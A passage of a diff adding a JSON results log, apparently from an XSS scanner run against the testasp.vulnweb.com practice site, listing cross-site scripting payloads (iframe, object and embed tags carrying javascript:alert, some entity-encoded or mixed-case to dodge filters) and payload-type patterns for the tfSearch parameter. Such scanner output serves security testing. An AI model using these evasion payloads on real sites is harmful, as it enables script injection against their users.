+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.678032"
+    },
+    {
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.693512"
+    },
+    {
+      "payload": "<&#105;&#102;&#114;&#97;&#109;&#101; &#115;&#114;&#99;=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:&#97;&#108;&#101;&#114;&#116;(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.701005"
+    },
+    {
+      "payload": "<IFraME SRc=\"JaVascrIpt:AlErt(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.705561"
+    },
+    {
+      "payload": "<object data=\"javascript:alert(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.715436"
+    },
+    {
+      "payload": "<&#111;&#98;&#106;&#101;&#99;&#116; &#100;&#97;&#116;&#97;=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:&#97;&#108;&#101;&#114;&#116;(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.732322"
+    },
+    {
+      "payload": "<obJeCT dATa=\"JAvaScRIPt:ALerT(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.739527"
+    },
+    {
+      "payload": "<embed src=\"javascript:alert(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.748323"
+    },
+    {
+      "payload": "<&#101;&#109;&#98;&#101;&#100; &#115;&#114;&#99;=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:&#97;&#108;&#101;&#114;&#116;(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.759474"
+    },
+    {
+      "payload": "<EmBeD SRC=\"JAvascrIpT:aLeRt(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.775286"
+    }
+  ],
+  "patterns": [
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "script"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "script"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "script"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "script"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "script"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "script"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "script"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "script"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "event_handler"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "other"
+    },
+    {
+      "url_pattern": "http://testasp.vulnweb.com/Search.asp",
+      "param_pattern": "tfSearch",
+      "context": "html",
+      "payload_type": "protocol"
+    }
+  ],
+  "last_updated": "2026-05-10T12:51:49.775518"
+}
